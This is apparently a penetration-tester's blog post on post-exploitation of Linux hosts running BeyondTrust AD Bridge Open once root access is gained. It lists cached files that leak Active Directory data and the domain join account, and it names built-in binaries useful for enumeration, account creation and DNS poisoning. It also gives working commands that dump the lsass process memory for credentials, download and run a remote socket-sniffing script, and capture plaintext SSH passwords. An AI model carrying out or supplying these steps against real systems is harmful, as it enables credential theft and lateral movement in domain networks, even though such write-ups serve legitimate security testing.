---
title: "BeyondTrust AD Bridge Open Post-Exploitation"
layout: "post"
---

[AD Bridge Open](https://github.com/BeyondTrust/pbis-open) is an open-source community project sponsored by BeyondTrust Corporation.

Active Directory Bridging (AD Bridging) is a mechanism that allows users to log on to non-Windows systems using Active Directory (AD) login credentials.

It is essentially a wrapper application that will facilitate the integration of \*nix hosts with Microsoft Active Directory (sets up Kerberos and LDAP Auth).

This post describes a few post-exploitation tips, were ROOT access was obtained on a Linux host that is using AD Bridge Open. Also the post content is based on the last open source version that is available on GitHub (AD Bridge Open 9.1.0.551). The project was discontinued and moved to a enterprise closed source model in 2021.



## Builtin binaries and files for situational awareness

AD Bridge Open installs and uses several binaries that are very useful for enumerating of the Active Directory environment - especially if the Linux box was streamlined and does not have installed any of the typical LDAP or SMB clients present on Linux distributions.

The software keeps a cache file of domain users and associated Active Directory information on this file `/var/lib/pbis/db/lsass-adcache.filedb.DOMAIN.LOCAL`. A lot of information about Active Directory environment, without making any request to the Domain Controllers, can be extracted from this file.

<p align="center">
  <img src="/assets/posts/2023-03-15-BeyondTrust-AD-Bridge-Open-Post-Exploitation/z_pbis-1.png">
</p>



Another interesting file is `/var/lib/pbis/db/lwi_events.db`. If the Active Directory has been hardened and the Machine Account Quota is set to zero for all regular domain accounts, by reading this file one can get the domain account that was used to join the Linux machine to the domain - again without making a single request to the Domain Controllers.

<p align="center">
  <img src="/assets/posts/2023-03-15-BeyondTrust-AD-Bridge-Open-Post-Exploitation/z_pbis-2.png">
</p>



As for useful LOLBIN's for enumeration and situational awareness, they all reside on the directory `/opt/pbis/bin/`

<p align="center">
  <img src="/assets/posts/2023-03-15-BeyondTrust-AD-Bridge-Open-Post-Exploitation/z_pbis-3.png">
</p>


These are pretty much self explanatory:

 - `/opt/pbis/bin/enum-groups`
 - `/opt/pbis/bin/enum-members`
 - `/opt/pbis/bin/enum-objects`
 - `/opt/pbis/bin/enum-users`
 - `/opt/pbis/bin/list-groups-for-user`
 - `/opt/pbis/bin/find-by-sid`
 - `/opt/pbis/bin/find-group-by-id`
 - `/opt/pbis/bin/find-group-by-name`
 - `/opt/pbis/bin/find-objects`
 - `/opt/pbis/bin/find-user-by-id`
 - `/opt/pbis/bin/find-user-by-name`
 - `/opt/pbis/bin/ldapsearch`


`/opt/pbis/bin/get-dc-list DOMAIN.LOCAL` will output the names and IPs of all Domain Controllers.


`/opt/pbis/bin/adtool` can query and modify objects in Active Directory - eg: add user or computer accounts.


`/opt/pbis/bin/get-dc-list/update-dns` Registers IP addresses and corresponding PTR records in DNS via a secure dynamic DNS update that could be handy for ADIDNS Zone poisoning.


`/opt/pbis/bin/lwio-copy` is a SMB client that can be used to transfer files.



You can find more details about the binaries function, command flags and whatnot on the [official documentation]:(https://www.beyondtrust.com/docs/ad-bridge/getting-started/linux-admin/index.htm)




# Domain credentials for lateral movement and privilege escalation

As with any pentesting or red teaming engagement I want to obtain Domain credentials to move laterally and/or escalate privileges.

In order to get some plain text credentials the LSASS process can be targeted in similar Mimikatz fashion, minus the windows memory structures parsing complexities of Windows LSASS.

<p align="center">
  <img src="/assets/posts/2023-03-15-BeyondTrust-AD-Bridge-Open-Post-Exploitation/z_pbis-4.png">
</p>


SSH is integrated with Active Directory using AD Bridge Open, so I can dump the process memory, run strings and grep for SSH authentications.


GDB can be attached using one of the AD Bridge Open binaries `/opt/pbis/bin/lwsm gdb lsass`

<p align="center">
  <img src="/assets/posts/2023-03-15-BeyondTrust-AD-Bridge-Open-Post-Exploitation/z_pbis-5.png">
</p>


Or I can just run ``gcore `ps aux | grep '[l]sass' | awk '{print $2}'` && strings core.* | grep -C 8 -Hnia --color=auto "ssh"``

<p align="center">
  <img src="/assets/posts/2023-03-15-BeyondTrust-AD-Bridge-Open-Post-Exploitation/z_pbis-6.png">
</p>


The only issue with this method is that it's a hit-and-miss affair with the grep "offsets" being used. Sometimes I get the user credential within the offsets, other times I get nothing and the credential is somewhere inside the ~1Gb memory dump file.


So I decided to look again at the files being used by AD Bridge Open, and found several of Unix Sockets in use on the directory `/var/lib/pbis/`

<p align="center">
  <img src="/assets/posts/2023-03-15-BeyondTrust-AD-Bridge-Open-Post-Exploitation/z_pbis-7.png">
</p>


`.lsassd` appeared interesting so I decided to sniff its traffic.

I'll need to install Wireshark/tcpdump and socat and then run a small bash script to accomplish this.

Since I have to wait for a SSH connection, I'm going to run everything from a Tmux session, that way I can detach it and leave it running.

``
yum -y install wireshark socat tmux
tmux
wget https://gist.githubusercontent.com/ricardojba/05d8ca06717292798054ca968082b70a/raw/5eea101b9054b19aa21714b2cbcbc5bc2173cdf4/unixsock-sniff.sh -O unixsock-sniff.sh
chmod 755 unixsock-sniff.sh
./unixsock-sniff.sh -u /var/lib/pbis/.lsassd
``

<p align="center">
  <img src="/assets/posts/2023-03-15-BeyondTrust-AD-Bridge-Open-Post-Exploitation/z_pbis-8.png">
</p>

If the Linux box is active with users or there is some automated scanning software that does authenticated scans against the server infrastructure (eg: Nessus) I should get a login in via SSH with a password, and capture plain text credentials.

`tshark -x -r /tmp/unix_socket_dump.pcap | grep -C 8 sshd`


Pretty sure that there's a lot that I didn't covered or missed, but this will help get us started in a pentest or red team of \*nix hosts with BeyondTrust AD Bridge Open installed.

